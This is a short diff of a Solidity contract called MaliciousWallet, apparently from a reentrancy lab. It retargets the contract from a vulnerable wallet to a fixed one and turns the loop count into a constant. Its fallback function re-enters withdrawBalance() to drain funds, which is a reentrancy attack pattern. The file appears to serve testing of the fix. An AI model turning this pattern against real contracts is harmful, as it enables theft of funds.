@@ -1,10 +1,11 @@
 pragma solidity ^0.5.8;
 
-import "./VulnerableWallet.sol";
+import "./FixWalletB.sol";
 
 
 contract MaliciousWallet {
     uint private iterations = 0;
+    uint constant private MAX_ITERATION = 3;
     Wallet wallet;
 
     constructor(address walletAddress) public {
@@ -22,7 +23,7 @@ contract MaliciousWallet {
     }
 
     function() external payable{
-        if (iterations < 2) {
+        if (iterations < MAX_ITERATION - 1) {
             iterations += 1;
             wallet.withdrawBalance();
         }
